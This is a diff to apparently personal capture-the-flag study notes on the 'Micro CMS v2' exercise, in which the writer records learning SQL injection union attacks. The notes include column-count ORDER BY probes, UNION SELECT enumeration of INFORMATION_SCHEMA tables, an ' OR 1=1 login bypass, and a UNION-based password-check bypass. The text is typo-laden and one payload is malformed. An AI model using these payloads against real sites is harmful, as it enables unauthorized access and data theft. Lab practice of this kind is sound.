@@ -45,4 +45,18 @@ MICRO CMS V2 ....(Im starting it from here because I figured it was somewhat eas
 
      I am learning about union attacks 
 
-     STep 1 figure out number of columns first
+     STep 1 figure out number of columns first using order by payload
+     test' order by 1-- // no error 1 column exists
+      if error occurts that mch colum doesn't exist
+      to figured displayed columnss ... ' Union select 111,222,333,444,555 // (inputs depend on how many 
+      columns were detected)---// WE figure which columns are displayed because only displayed ones can be seen on output
+    To find all list of user name do 'UNION SELECT NULL,TABLE_NAME,NULL FRP ,INFORMATION_SCHEMA.TABLES--;
+
+    I managed to get username to be correct using ' OR 1=1 ; injection it seems.... yaaay
+    What I have figured at 6pm is that you see i need to merge the results i get with something a dumm y password to make servert think result has results since its only testing the result
+    I am very sure I have to use UNION SELECT 'test';--
+    I think app might me using number of rows returned
+    i'l try
+    js
+    ' UNION select 'xyz';-- with xyz as password for payload
+    Yaaay it worked I hav eno idea why though I even had to cheat to get the freaking code because heck m i supposed to find it 
